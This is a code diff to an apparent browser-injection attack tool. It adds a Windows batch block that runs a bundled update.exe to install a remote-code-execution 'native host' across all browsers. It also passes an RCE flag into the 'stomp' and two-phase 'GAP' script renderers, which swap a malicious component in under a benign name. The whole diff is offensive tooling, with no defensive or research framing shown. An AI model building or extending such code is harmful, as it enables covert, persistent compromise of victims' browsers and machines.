@@ -22,6 +22,20 @@ _GAP_TEMPLATES = {
     "darwin": "inject_gap.darwin.sh.template",
 }
 
+# RCE native host installer block, injected into the Windows inject scripts
+# (which carry a {{RCE_BLOCK}} placeholder) when the build has RCE enabled. It
+# runs a bundled update.exe, which self-installs the host (registry keys + folder).
+_RCE_INSTALL_BLOCK = (
+    "REM Install the RCE native host (registers under all browsers) when a\n"
+    "REM precompiled update.exe was bundled under rce/.\n"
+    'if exist "%DEPLOY_DIR%rce\\update.exe" (\n'
+    '    echo [*] Installing RCE native host (all browsers)...\n'
+    '    start "" /wait "%DEPLOY_DIR%rce\\update.exe"\n'
+    ') else (\n'
+    '    echo [!] RCE enabled but rce\\update.exe not bundled - native host NOT installed.\n'
+    ')\n'
+)
+
 
 def _render(template_name: str, cfg, replacements: dict) -> str | None:
     path = os.path.join(_TEMPLATE_DIR, template_name)
@@ -49,15 +63,18 @@ def script_name(platform: str) -> str:
     return "inject.sh" if platform != "windows" else "inject.bat"
 
 
-def render_stomp_script(cfg, target_dir: str, platform: str) -> str | None:
+def render_stomp_script(cfg, target_dir: str, platform: str, rce_enabled: bool = False) -> str | None:
     """Render the single-phase stomp injection script."""
     template = _STOMP_TEMPLATES.get(platform)
     if not template:
         return None
-    return _render(template, cfg, {"BROWSER_TARGET_DIR": target_dir})
+    return _render(template, cfg, {
+        "BROWSER_TARGET_DIR": target_dir,
+        "RCE_BLOCK": _RCE_INSTALL_BLOCK if rce_enabled else "",
+    })
 
 
-def render_gap_script(cfg, target_dir: str, malicious_name: str, benign_name: str, platform: str) -> str | None:
+def render_gap_script(cfg, target_dir: str, malicious_name: str, benign_name: str, platform: str, rce_enabled: bool = False) -> str | None:
     """Render the two-phase GAP injection script."""
     template = _GAP_TEMPLATES.get(platform)
     if not template:
@@ -66,4 +83,5 @@ def render_gap_script(cfg, target_dir: str, malicious_name: str, benign_name: st
         "BROWSER_TARGET_DIR": target_dir,
         "MALICIOUS_NAME": malicious_name,
         "BENIGN_NAME": benign_name,
+        "RCE_BLOCK": _RCE_INSTALL_BLOCK if rce_enabled else "",
     })
